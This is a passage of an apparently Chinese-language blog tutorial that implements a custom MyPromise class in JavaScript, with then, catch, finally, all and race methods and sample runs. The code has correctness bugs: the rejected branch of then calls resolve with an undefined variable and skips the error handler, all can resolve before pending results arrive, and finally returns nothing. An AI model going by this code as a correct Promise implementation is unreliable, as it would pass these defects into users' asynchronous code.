class=\"keyword\">const</span> p1 = <span class=\"keyword\">new</span> <span class=\"title function_\">myPromise</span>(<span class=\"function\">(<span class=\"params\">resolve, reject</span>) =&gt;</span> {</span><br><span class=\"line\">    <span class=\"title function_\">resolve</span>(<span class=\"number\">111</span>);</span><br><span class=\"line\">    <span class=\"title function_\">reject</span>(<span class=\"number\">333333</span>);</span><br><span class=\"line\">})</span><br><span class=\"line\">p1.<span class=\"title function_\">then</span>(<span class=\"function\"><span class=\"params\">res</span> =&gt;</span> {</span><br><span class=\"line\">    <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"string\">\"res1:\"</span>, res);</span><br><span class=\"line\">}, <span class=\"function\"><span class=\"params\">err</span> =&gt;</span> {</span><br><span class=\"line\">    <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"string\">\"err1:\"</span>, err);</span><br><span class=\"line\">})</span><br><span class=\"line\"><span class=\"comment\">// 调用then方法多次调用</span></span><br><span class=\"line\">p1.<span class=\"title function_\">then</span>(<span class=\"function\"><span class=\"params\">res</span> =&gt;</span> {</span><br><span class=\"line\">    <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"string\">\"res2:\"</span>, res);</span><br><span class=\"line\">}, <span class=\"function\"><span class=\"params\">err</span> =&gt;</span> {</span><br><span class=\"line\">    <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"string\">\"err2:\"</span>, err);</span><br><span class=\"line\">})</span><br><span class=\"line\">执行结果：</span><br><span class=\"line\"><span class=\"attr\">res1</span>: <span class=\"number\">111</span></span><br><span class=\"line\"><span class=\"attr\">res2</span>: <span class=\"number\">111</span></span><br></pre></td></tr></tbody></table></figure><p></p>\n<ol start=\"5\">\n<li><p>catch 添加对 Promise 对象拒绝时的处理程序</p>\n<figure class=\"highlight js\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 添加对Promise对象拒绝时的处理程序。</span></span><br><span class=\"line\"><span class=\"keyword\">catch</span>(errFn) {</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"variable language_\">this</span>.<span class=\"title function_\">then</span>(<span class=\"literal\">undefined</span>, errFn);</span><br><span class=\"line\">}</span><br></pre></td></tr></tbody></table></figure>\n</li>\n<li><p>finally 添加对 Promise 对象解决或拒绝时的最终处理程序，无论 Promise 对象是否已被解决或拒绝。</p>\n<figure class=\"highlight js\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"title function_\">finally</span>(<span class=\"params\">fn</span>) {</span><br><span class=\"line\">  <span class=\"built_in\">setTimeout</span>(<span class=\"function\">() =&gt;</span> {</span><br><span class=\"line\">    <span class=\"title function_\">fn</span>();</span><br><span class=\"line\">  }, <span class=\"number\">0</span>);</span><br><span class=\"line\">}</span><br></pre></td></tr></tbody></table></figure></li>\n<li><p>all 接收一个可迭代对象（如数组），并返回一个新的 Promise 对象。当所有 Promise 对象都已解决时，该 Promise 对象才将被解决，并返回一个包含所有解决值的数组。</p>\n<figure class=\"highlight js\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 通过类型判断当前数组中的方法或者对象是否为Promise 对象</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> isPromise = <span class=\"keyword\">function</span>(<span class=\"params\">promise</span>) {</span><br><span class=\"line\">  <span class=\"keyword\">return</span> (</span><br><span class=\"line\">    !!promise &amp;&amp;</span><br><span class=\"line\">    (<span class=\"keyword\">typeof</span> promise === <span class=\"string\">\"object\"</span> || <span class=\"keyword\">typeof</span> promise === <span class=\"string\">\"function\"</span>) &amp;&amp;</span><br><span class=\"line\">    <span class=\"keyword\">typeof</span> promise.<span class=\"property\">then</span> === <span class=\"string\">\"function\"</span></span><br><span class=\"line\">  );</span><br><span class=\"line\">};</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * 接收一个可迭代对象（如数组），并返回一个新的Promise对象。</span></span><br><span class=\"line\"><span class=\"comment\"> * 当所有Promise对象都已解决时，该Promise对象才将被解决，并返回一个包含所有解决值的数组。</span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@param</span> {<span class=\"type\">any[]</span>} <span class=\"variable\">iterable</span></span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@desc</span> 实际上多个对象同步执行时，就相当于把所有的方法重新进行Promise一次。</span></span><br><span class=\"line\"><span class=\"comment\"> * 当遍历到最后一个时，resolve 所有结果。</span></span><br><span class=\"line\"><span class=\"comment\"> * </span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"title class_\">MyPromise</span>.<span class=\"property\">all</span> = <span class=\"keyword\">function</span>(<span class=\"params\">iterable</span>) {</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (!(iterable <span class=\"keyword\">instanceof</span> <span class=\"title class_\">Array</span>)) {</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"string\">\"传入参数必须是一个数组\"</span>);</span><br><span class=\"line\">  }</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"keyword\">new</span> <span class=\"title class_\">MyPromise</span>(<span class=\"function\">(<span class=\"params\">resolve, reject</span>) =&gt;</span> {</span><br><span class=\"line\">    <span class=\"keyword\">let</span> len = iterable.<span class=\"property\">length</span>;</span><br><span class=\"line\">    <span class=\"keyword\">let</span> count = <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"keyword\">let</span> results = <span class=\"keyword\">new</span> <span class=\"title class_\">Array</span>(len);</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> i = <span class=\"number\">0</span>; i &lt; len; i++) {</span><br><span class=\"line\">      <span class=\"keyword\">let</span> promise = iterable[i];</span><br><span class=\"line\">      count++;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (<span class=\"title function_\">isPromise</span>(promise)) {</span><br><span class=\"line\">        promise</span><br><span class=\"line\">          .<span class=\"title function_\">then</span>(<span class=\"function\">(<span class=\"params\">res</span>) =&gt;</span> {</span><br><span class=\"line\">            results[i] = res;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (count === len) {</span><br><span class=\"line\">              <span class=\"title function_\">resolve</span>(results);</span><br><span class=\"line\">            }</span><br><span class=\"line\">          })</span><br><span class=\"line\">          .<span class=\"title function_\">catch</span>(<span class=\"function\">(<span class=\"params\">err</span>) =&gt;</span> {</span><br><span class=\"line\">            <span class=\"title function_\">reject</span>(err);</span><br><span class=\"line\">          });</span><br><span class=\"line\">      } <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (<span class=\"keyword\">typeof</span> promise === <span class=\"string\">\"function\"</span>) {</span><br><span class=\"line\">        results[i] = <span class=\"title function_\">promise</span>();</span><br><span class=\"line\">      } <span class=\"keyword\">else</span> {</span><br><span class=\"line\">        results[i] = promise;</span><br><span class=\"line\">      }</span><br><span class=\"line\">    }</span><br><span class=\"line\">    <span class=\"comment\">// 当数据的所有项都不是promise实例，我们就在这判断多一次，然后resolve</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (count === len) {</span><br><span class=\"line\">      <span class=\"title function_\">resolve</span>(results);</span><br><span class=\"line\">    }</span><br><span class=\"line\">  });</span><br><span class=\"line\">};</span><br></pre></td></tr></tbody></table></figure>\n<p>all 运行示例</p>\n<figure class=\"highlight js\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\">(<span class=\"keyword\">async</span> <span class=\"keyword\">function</span>(<span class=\"params\"></span>) {</span><br><span class=\"line\">  <span class=\"keyword\">const</span> res = <span class=\"title class_\">MyPromise</span>.<span class=\"title function_\">all</span>([</span><br><span class=\"line\">    <span class=\"keyword\">new</span> <span class=\"title class_\">MyPromise</span>(<span class=\"function\">(<span class=\"params\">resolve</span>) =&gt;</span> {</span><br><span class=\"line\">      <span class=\"title function_\">resolve</span>(<span class=\"number\">1</span>);</span><br><span class=\"line\">    }),</span><br><span class=\"line\">    <span class=\"keyword\">new</span> <span class=\"title class_\">MyPromise</span>(<span class=\"function\">(<span class=\"params\">resolve</span>) =&gt;</span> {</span><br><span class=\"line\">      <span class=\"title function_\">resolve</span>(<span class=\"number\">2</span>);</span><br><span class=\"line\">    }),</span><br><span class=\"line\">    <span class=\"function\">() =&gt;</span> {</span><br><span class=\"line\">      <span class=\"keyword\">return</span> <span class=\"number\">123</span>;</span><br><span class=\"line\">    },</span><br><span class=\"line\">    <span class=\"number\">88888</span>,</span><br><span class=\"line\">  ]);</span><br><span class=\"line\">  res.<span class=\"title function_\">then</span>(<span class=\"function\">(<span class=\"params\">res</span>) =&gt;</span> {</span><br><span class=\"line\">    <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(res);</span><br><span class=\"line\">  });</span><br><span class=\"line\">})();</span><br><span class=\"line\">运行结果: [<span class=\"number\">1</span>, <span class=\"number\">2</span>, <span class=\"number\">123</span>,  <span class=\"number\">88888</span>]</span><br></pre></td></tr></tbody></table></figure>\n</li>\n<li><p>race Promise.race (iterable) 传入多个对象，当任何一个执行完成后 resolve 结果</p>\n</li>\n</ol>\n<figure class=\"highlight js\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"title class_\">MyPromise</span>.<span class=\"property\">race</span> = <span class=\"keyword\">function</span>(<span class=\"params\">iterable</span>) {</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (!(iterable <span class=\"keyword\">instanceof</span> <span class=\"title class_\">Array</span>)) {</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"string\">\"传入参数必须是一个数组\"</span>);</span><br><span class=\"line\">  }</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"keyword\">new</span> <span class=\"title class_\">MyPromise</span>(<span class=\"function\">(<span class=\"params\">resolve, reject</span>) =&gt;</span> {</span><br><span class=\"line\">    iterable.<span class=\"title function_\">forEach</span>(<span class=\"function\">(<span class=\"params\">p</span>) =&gt;</span> {</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (<span class=\"title function_\">isPromise</span>(p)) {</span><br><span class=\"line\">        p.<span class=\"title function_\">then</span>(<span class=\"function\">(<span class=\"params\">value</span>) =&gt;</span> {</span><br><span class=\"line\">          <span class=\"title function_\">resolve</span>(value);</span><br><span class=\"line\">        }).<span class=\"title function_\">catch</span>(<span class=\"function\">(<span class=\"params\">err</span>) =&gt;</span> {</span><br><span class=\"line\">          <span class=\"title function_\">reject</span>(err);</span><br><span class=\"line\">        });</span><br><span class=\"line\">      } <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (<span class=\"keyword\">typeof</span> p === <span class=\"string\">\"function\"</span>) {</span><br><span class=\"line\">        <span class=\"title function_\">resolve</span>(<span class=\"title function_\">p</span>());</span><br><span class=\"line\">      } <span class=\"keyword\">else</span> {</span><br><span class=\"line\">        <span class=\"title function_\">resolve</span>(p);</span><br><span class=\"line\">      }</span><br><span class=\"line\">    });</span><br><span class=\"line\">  });</span><br><span class=\"line\">};</span><br></pre></td></tr></tbody></table></figure>\n<p>race 运行示例</p>\n<figure class=\"highlight js\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\">(<span class=\"keyword\">async</span> <span class=\"keyword\">function</span>(<span class=\"params\"></span>) {</span><br><span class=\"line\">  <span class=\"keyword\">const</span> res = <span class=\"title class_\">MyPromise</span>.<span class=\"title function_\">race</span>([</span><br><span class=\"line\">    <span class=\"keyword\">new</span> <span class=\"title class_\">MyPromise</span>(<span class=\"function\">(<span class=\"params\">resolve</span>) =&gt;</span> {</span><br><span class=\"line\">      <span class=\"title function_\">resolve</span>(<span class=\"number\">1</span>);</span><br><span class=\"line\">    }),</span><br><span class=\"line\">    <span class=\"keyword\">new</span> <span class=\"title class_\">MyPromise</span>(<span class=\"function\">(<span class=\"params\">resolve</span>) =&gt;</span> {</span><br><span class=\"line\">      <span class=\"title function_\">resolve</span>(<span class=\"number\">2</span>);</span><br><span class=\"line\">    }),</span><br><span class=\"line\">  ]);</span><br><span class=\"line\">  res.<span class=\"title function_\">then</span>(<span class=\"function\">(<span class=\"params\">res</span>) =&gt;</span> {</span><br><span class=\"line\">    <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(res);</span><br><span class=\"line\">  });</span><br><span class=\"line\">})();</span><br><span class=\"line\">运行结果： <span class=\"number\">1</span></span><br></pre></td></tr></tbody></table></figure>\n\n<p>完整代码</p>\n<figure class=\"highlight js\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// status</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> <span class=\"variable constant_\">PROMISE_STATUE_PENDING</span> = <span class=\"string\">\"pending\"</span>; <span class=\"comment\">// 进行中</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> <span class=\"variable constant_\">PROMISE_STATUE_FULFILLED</span> = <span class=\"string\">\"fulfilled\"</span>; <span class=\"comment\">// 已完成</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> <span class=\"variable constant_\">PROMISE_STATUE_REJECTED</span> = <span class=\"string\">\"rejected\"</span>; <span class=\"comment\">// 已拒绝</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">MyPromise</span> {</span><br><span class=\"line\">  <span class=\"title function_\">constructor</span>(<span class=\"params\">executer</span>) {</span><br><span class=\"line\">    <span class=\"variable language_\">this</span>.<span class=\"property\">statue</span> = <span class=\"variable constant_\">PROMISE_STATUE_PENDING</span>;</span><br><span class=\"line\">    <span class=\"variable language_\">this</span>.<span class=\"property\">value</span> = <span class=\"keyword\">void</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"variable language_\">this</span>.<span class=\"property\">error</span> = <span class=\"keyword\">void</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"variable language_\">this</span>.<span class=\"property\">resFns</span> = [];</span><br><span class=\"line\">    <span class=\"variable language_\">this</span>.<span class=\"property\">errFns</span> = [];</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"title function_\">executer</span>(<span class=\"variable language_\">this</span>.<span class=\"property\">resolve</span>, <span class=\"variable language_\">this</span>.<span class=\"property\">reject</span>);</span><br><span class=\"line\">  }</span><br><span class=\"line\">  <span class=\"comment\">//    创建一个已解决的Promise对象，将给定的值作为其参数。</span></span><br><span class=\"line\">  resolve = <span class=\"function\">(<span class=\"params\">value</span>) =&gt;</span> {</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"variable language_\">this</span>.<span class=\"property\">statue</span> === <span class=\"variable constant_\">PROMISE_STATUE_PENDING</span>) {</span><br><span class=\"line\">      <span class=\"title function_\">queueMicrotask</span>(<span class=\"function\">() =&gt;</span> {</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"variable language_\">this</span>.<span class=\"property\">statue</span> !== <span class=\"variable constant_\">PROMISE_STATUE_PENDING</span>) <span class=\"keyword\">return</span>;</span><br><span class=\"line\">        <span class=\"variable language_\">this</span>.<span class=\"property\">statue</span> = <span class=\"variable constant_\">PROMISE_STATUE_FULFILLED</span>;</span><br><span class=\"line\">        <span class=\"variable language_\">this</span>.<span class=\"property\">value</span> = value;</span><br><span class=\"line\">        <span class=\"variable language_\">this</span>.<span class=\"property\">resFns</span>?.<span class=\"title function_\">forEach</span>(<span class=\"function\">(<span class=\"params\">fn</span>) =&gt;</span> {</span><br><span class=\"line\">          <span class=\"title function_\">fn</span>(<span class=\"variable language_\">this</span>.<span class=\"property\">value</span>);</span><br><span class=\"line\">        });</span><br><span class=\"line\">      });</span><br><span class=\"line\">    }</span><br><span class=\"line\">  };</span><br><span class=\"line\">  <span class=\"comment\">// 创建一个已拒绝的Promise对象，将给定的原因作为其参数。</span></span><br><span class=\"line\">  reject = <span class=\"function\">(<span class=\"params\">error</span>) =&gt;</span> {</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"variable language_\">this</span>.<span class=\"property\">statue</span> === <span class=\"variable constant_\">PROMISE_STATUE_PENDING</span>) {</span><br><span class=\"line\">      <span class=\"title function_\">queueMicrotask</span>(<span class=\"function\">() =&gt;</span> {</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"variable language_\">this</span>.<span class=\"property\">statue</span> !== <span class=\"variable constant_\">PROMISE_STATUE_PENDING</span>) <span class=\"keyword\">return</span>;</span><br><span class=\"line\">        <span class=\"variable language_\">this</span>.<span class=\"property\">statue</span> = <span class=\"variable constant_\">PROMISE_STATUE_REJECTED</span>;</span><br><span class=\"line\">        <span class=\"variable language_\">this</span>.<span class=\"property\">error</span> = error;</span><br><span class=\"line\">        <span class=\"variable language_\">this</span>.<span class=\"property\">errFns</span>.<span class=\"title function_\">forEach</span>(<span class=\"function\">(<span class=\"params\">en</span>) =&gt;</span> {</span><br><span class=\"line\">          <span class=\"title function_\">en</span>(<span class=\"variable language_\">this</span>.<span class=\"property\">error</span>);</span><br><span class=\"line\">        });</span><br><span class=\"line\">      });</span><br><span class=\"line\">    }</span><br><span class=\"line\">  };</span><br><span class=\"line\">  <span class=\"comment\">//   添加对Promise对象解决或拒绝时的处理程序。</span></span><br><span class=\"line\">  <span class=\"title function_\">then</span>(<span class=\"params\">resFn, errFn</span>) {</span><br><span class=\"line\">    <span class=\"keyword\">const</span> <span class=\"title function_\">defaultOnRejected</span> = (<span class=\"params\">err</span>) =&gt; {</span><br><span class=\"line\">      <span class=\"keyword\">throw</span> err;</span><br><span class=\"line\">    };</span><br><span class=\"line\">    errFn = errFn || defaultOnRejected;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">const</span> <span class=\"title function_\">defaultOnFulFilled</span> = (<span class=\"params\">value</span>) =&gt; {</span><br><span class=\"line\">      <span class=\"keyword\">return</span> value;</span><br><span class=\"line\">    };</span><br><span class=\"line\">    resFn = resFn || defaultOnFulFilled;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"keyword\">new</span> <span class=\"title class_\">MyPromise</span>(<span class=\"function\">(<span class=\"params\">resolve, reject</span>) =&gt;</span> {</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (<span class=\"variable language_\">this</span>.<span class=\"property\">statue</span> === <span class=\"variable constant_\">PROMISE_STATUE_FULFILLED</span> &amp;&amp; !!resFn) {</span><br><span class=\"line\">        <span class=\"keyword\">try</span> {</span><br><span class=\"line\">          <span class=\"keyword\">const</span> value = <span class=\"title function_\">resFn</span>(<span class=\"variable language_\">this</span>.<span class=\"property\">value</span>);</span><br><span class=\"line\">          <span class=\"title function_\">resolve</span>(value);</span><br><span class=\"line\">        } <span class=\"keyword\">catch</span> (error) {</span><br><span class=\"line\">          <span class=\"title function_\">reject</span>(error);</span><br><span class=\"line\">        }</span><br><span class=\"line\">      }</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (<span class=\"variable language_\">this</span>.<span class=\"property\">statue</span> === <span class=\"variable constant_\">PROMISE_STATUE_REJECTED</span> &amp;&amp; !!errFn) {</span><br><span class=\"line\">        <span class=\"keyword\">try</span> {</span><br><span class=\"line\">          <span class=\"title function_\">resolve</span>(value);</span><br><span class=\"line\">        } <span class=\"keyword\">catch</span> (error) {</span><br><span class=\"line\">          <span class=\"title function_\">reject</span>(error);</span><br><span class=\"line\">        }</span><br><span class=\"line\">      }</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (<span class=\"variable language_\">this</span>.<span class=\"property\">statue</span> === <span class=\"variable constant_\">PROMISE_STATUE_PENDING</span>) {</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (!!resFn) {</span><br><span class=\"line\">          <span class=\"variable language_\">this</span>.<span class=\"property\">resFns</span>.<span class=\"title function_\">push</span>(<span class=\"function\">() =&gt;</span> {</span><br><span class=\"line\">            <span class=\"keyword\">try</span> {</span><br><span class=\"line\">              <span class=\"keyword\">const</span> value = <span class=\"title function_\">resFn</span>(<span class=\"variable language_\">this</span>.<span class=\"property\">value</span>);</span><br><span class=\"line\">              <span class=\"title function_\">resolve</span>(value);</span><br><span class=\"line\">            } <span class=\"keyword\">catch</span> (error) {</span><br><span class=\"line\">              <span class=\"title function_\">reject</span>(error);</span><br><span class=\"line\">            }</span><br><span class=\"line\">          });</span><br><span class=\"line\">        }</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (!!errFn) {</span><br><span class=\"line\">          <span class=\"variable language_\">this</span>.<span class=\"property\">errFns</span>.<span class=\"title function_\">push</span>(<span class=\"function\">() =&gt;</span> {</span><br><span class=\"line\">            <span class=\"keyword\">try</span> {</span><br><span class=\"line\">              <span class=\"keyword\">const</span> value = <span class=\"title function_\">errFn</span>(<span class=\"variable language_\">this</span>.<span class=\"property\">error</span>);</span><br><span class=\"line\">              <span class=\"title function_\">resolve</span>(value);</span><br><span class=\"line\">            } <span class=\"keyword\">catch</span> (error) {</span><br><span class=\"line\">              <span class=\"title function_\">reject</span>(error);</span><br><span class=\"line\">            }</span><br><span class=\"line\">          });</span><br><span class=\"line\">        }</span><br><span class=\"line\">      }</span><br><span class=\"line\">    });</span><br><span class=\"line\">  }</span><br><span class=\"line\">  <span class=\"comment\">// 添加对Promise对象拒绝时的处理程序。</span></span><br><span class=\"line\">  <span class=\"keyword\">catch</span>(errFn) {</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"variable language_\">this</span>.<span class=\"title function_\">then</span>(<span class=\"literal\">undefined</span>, errFn);</span><br><span class=\"line\">  }</span><br><span class=\"line\">  <span class=\"comment\">// 添加对Promise对象解决或拒绝时的最终处理程序，无论Promise对象是否已被解决或拒绝。</span></span><br><span class=\"line\">  <span class=\"title function_\">finally</span>(<span class=\"params\">fn</span>) {</span><br><span class=\"line\">    <span class=\"built_in\">setTimeout</span>(<span class=\"function\">() =&gt;</span> {</span><br><span class=\"line\">      <span class=\"title function_\">fn</span>();</span><br><span class=\"line\">    }, <span class=\"number\">0</span>);</span><br><span class=\"line\">  }</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> isPromise = <span class=\"keyword\">function</span>(<span class=\"params\">promise</span>) {</span><br><span class=\"line\">  <span class=\"keyword\">return</span> (</span><br><span class=\"line\">    !!promise &amp;&amp;</span><br><span class=\"line\">    (<span class=\"keyword\">typeof</span> promise === <span class=\"string\">\"object\"</span> || <span class=\"keyword\">typeof</span> promise === <span class=\"string\">\"function\"</span>) &amp;&amp;</span><br><span class=\"line\">    <span class=\"keyword\">typeof</span> promise.<span class=\"property\">then</span> === <span class=\"string\">\"function\"</span></span><br><span class=\"line\">  );</span><br><span class=\"line\">};</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * 接收一个可迭代对象（如数组），并返回一个新的Promise对象。</span></span><br><span class=\"line\"><span class=\"comment\"> * 当所有Promise对象都已解决时，该Promise对象才将被解决，并返回一个包含所有解决值的数组。</span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@param</span> {<span class=\"type\">any[]</span>} <span class=\"variable\">iterable</span></span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"title class_\">MyPromise</span>.<span class=\"property\">all</span> = <span class=\"keyword\">function</span>(<span class=\"params\">iterable</span>) {</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (!(iterable <span class=\"keyword\">instanceof</span> <span class=\"title class_\">Array</span>)) {</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"string\">\"传入参数必须是一个数组\"</span>);</span><br><span class=\"line\">  }</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"keyword\">new</span> <span class=\"title class_\">MyPromise</span>(<span class=\"function\">(<span class=\"params\">resolve, reject</span>) =&gt;</span> {</span><br><span class=\"line\">    <span class=\"keyword\">let</span> len = iterable.<span class=\"property\">length</span>;</span><br><span class=\"line\">    <span class=\"keyword\">let</span> count = <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"keyword\">let</span> results = <span class=\"keyword\">new</span> <span class=\"title class_\">Array</span>(len);</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> i = <span class=\"number\">0</span>; i &lt; len; i++) {</span><br><span class=\"line\">      <span class=\"keyword\">let</span> promise = iterable[i];</span><br><span class=\"line\">      count++;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (<span class=\"title function_\">isPromise</span>(promise)) {</span><br><span class=\"line\">        promise</span><br><span class=\"line\">          .<span class=\"title function_\">then</span>(<span class=\"function\">(<span class=\"params\">res</span>) =&gt;</span> {</span><br><span class=\"line\">            results[i] = res;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (count === len) {</span><br><span class=\"line\">              <span class=\"title function_\">resolve</span>(results);</span><br><span class=\"line\">            }</span><br><span class=\"line\">          })</span><br><span class=\"line\">          .<span class=\"title function_\">catch</span>(<span class=\"function\">(<span class=\"params\">err</span>) =&gt;</span> {</span><br><span class=\"line\">            <span class=\"title function_\">reject</span>(err);</span><br><span class=\"line\">          });</span><br><span class=\"line\">      } <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (<span class=\"keyword\">typeof</span> promise === <span class=\"string\">\"function\"</span>) {</span><br><span class=\"line\">        results[i] = <span class=\"title function_\">promise</span>();</span><br><span class=\"line\">      } <span class=\"keyword\">else</span> {</span><br><span class=\"line\">        results[i] = promise;</span><br><span class=\"line\">      }</span><br><span class=\"line\">    }</span><br><span class=\"line\">    <span class=\"comment\">// 当数据的所有项都不是promise实例，我们就在这判断多一次，然后resolve</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (count === len) {</span><br><span class=\"line\">      <span class=\"title function_\">resolve</span>(results);</span><br><span class=\"line\">    }</span><br><span class=\"line\">  });</span><br><span class=\"line\">};</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"title class_\">MyPromise</span>.<span class=\"property\">race</span> = <span class=\"keyword\">function</span>(<span class=\"params\">iterable</span>) {</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (!(iterable <span class=\"keyword\">instanceof</span> <span class=\"title class_\">Array</span>)) {</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"string\">\"传入参数必须是一个数组\"</span>);</span><br><span class=\"line\">  }</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"keyword\">new</span> <span class=\"title class_\">MyPromise</span>(<span class=\"function\">(<span class=\"params\">resolve, reject</span>) =&gt;</span> {</span><br><span class=\"line\">    iterable.<span class=\"title function_\">forEach</span>(<span class=\"function\">(<span class=\"params\">p</span>) =&gt;</span> {</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (<span class=\"title function_\">isPromise</span>(p)) {</span><br><span class=\"line\">        p.<span class=\"title function_\">then</span>(<span class=\"function\">(<span class=\"params\">value</span>) =&gt;</span> {</span><br><span class=\"line\">          <span class=\"title function_\">resolve</span>(value);</span><br><span class=\"line\">        }).<span class=\"title function_\">catch</span>(<span class=\"function\">(<span class=\"params\">err</span>) =&gt;</span> {</span><br><span class=\"line\">          <span class=\"title function_\">reject</span>(err);</span><br><span class=\"line\">        });</span><br><span class=\"line\">      } <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (<span class=\"keyword\">typeof</span> p === <span class=\"string\">\"function\"</span>) {</span><br><span class=\"line\">        <span class=\"title function_\">resolve</span>(<span class=\"title function_\">p</span>());</span><br><span class=\"line\">      } <span class=\"keyword\">else</span> {</span><br><span class=\"line\">        <span class=\"title function_\">resolve</span>(p);</span><br><span class=\"line\">      }</span><br><span class=\"line\">    });</span><br><span class=\"line\">  });</span><br><span class=\"line\">};</span><br><span class=\"line\"><span class=\"comment\">// const p1 = new MyPromise((resolve, reject) =&gt; {</span></span><br><span class=\"line\"><span class=\"comment\">//   console.log(\"状态pending\");</span></span><br><span class=\"line\"><span class=\"comment\">//   resolve(\"22222\");</span></span><br><span class=\"line\"><span class=\"comment\">//   reject(\"3333333\");</span></span><br><span class=\"line\"><span class=\"comment\">// });</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// p1.then((res) =&gt; {</span></span><br><span class=\"line\"><span class=\"comment\">//   console.log(\"res1:\", res);</span></span><br><span class=\"line\"><span class=\"comment\">//   return \"第二次的成功回调\";</span></span><br><span class=\"line\"><span class=\"comment\">// })</span></span><br><span class=\"line\"><span class=\"comment\">//   .catch((error) =&gt; {</span></span><br><span class=\"line\"><span class=\"comment\">//     console.log(\"err1:\", error);</span></span><br><span class=\"line\"><span class=\"comment\">//     throw new Error(\"第二次的失败回调\");</span></span><br><span class=\"line\"><span class=\"comment\">//   })</span></span><br><span class=\"line\"><span class=\"comment\">//   .finally(() =&gt; {</span></span><br><span class=\"line\"><span class=\"comment\">//     console.log(\"finally\");</span></span><br><span class=\"line\"><span class=\"comment\">//   });</span></span><br><span class=\"line\"><span class=\"comment\">// (async function() {</span></span><br><span class=\"line\"><span class=\"comment\">//   const res = MyPromise.all([</span></span><br><span class=\"line\"><span class=\"comment\">//     new MyPromise((resolve) =&gt; {</span></span><br><span class=\"line\"><span class=\"comment\">//       resolve(1);</span></span><br><span class=\"line\"><span class=\"comment\">//     }),</span></span><br><span class=\"line\"><span class=\"comment\">//     new MyPromise((resolve) =&gt; 